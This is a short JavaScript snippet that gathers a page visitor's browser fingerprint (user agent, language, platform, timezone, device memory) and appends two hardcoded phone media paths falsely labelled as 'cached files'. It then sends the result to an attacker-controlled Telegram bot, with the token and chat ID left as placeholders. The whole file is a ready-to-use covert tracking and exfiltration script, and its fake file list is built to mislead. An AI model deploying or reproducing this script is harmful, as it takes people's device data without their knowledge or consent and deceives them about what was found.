(async () => {
    const fingerprint = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        deviceMemory: navigator.deviceMemory || "unknown"
    };

    const files = [
        "DCIM/Camera/VID_20240610.mp4",
        "WhatsApp/Media/IMG_20240608.jpg"
    ];

    let msg = `📸 *Media Fingerprint Found:*\n\n`;

    for (let key in fingerprint) {
        msg += `• ${key}: ${fingerprint[key]}\n`;
    }

    msg += `\n🗂️ *Possible Cached Files:*\n`;
    files.forEach(f => msg += `- ${f}\n`);

    // Send to your server
    fetch("https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: `chat_id=YOUR_CHAT_ID&text=${encodeURIComponent(msg)}&parse_mode=Markdown`
    });
})();
